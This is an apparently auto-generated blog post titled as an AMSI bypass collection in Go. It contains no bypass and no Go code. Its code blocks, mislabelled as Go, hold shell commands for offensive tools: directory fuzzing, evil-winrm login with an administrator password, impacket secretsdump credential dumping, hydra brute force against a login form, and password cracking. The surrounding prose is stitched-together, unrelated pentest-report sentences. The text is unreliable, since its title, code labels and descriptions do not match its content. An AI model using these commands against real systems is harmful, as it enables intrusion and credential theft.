---
TitleSEO: "AMSI Bypass Collection in Go | ZureFX"
TitlePost: "AMSI Bypass Collection — Go"
Author: "ZureFX"
Description: "A Go script for amsi bypass collection. Built for security research and automation."
Keywords: "tool, rust, bash, c, fuzzer, go"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-694.html"
URL_IMAGES: ""
Date: "2024-06-27"
Tags: "Tool, Rust, Bash, C, Fuzzer, Go"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-694"
Permalink: "/scripting/script-amsi-bypass-collection-694.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `socat`
- `hydra`
- `nmap`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
gobuster dir -u http://10.12.111.110/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.20.219.66 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.122.14
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.122.72.186/FUZZ
nmap -sCV -p27017,1521,27017 10.55.127.162 -oN scan.txt
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.116.4.124 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p995,1521,143 10.26.228.19 -oN scan.txt
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.80.51 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 28.34s
```
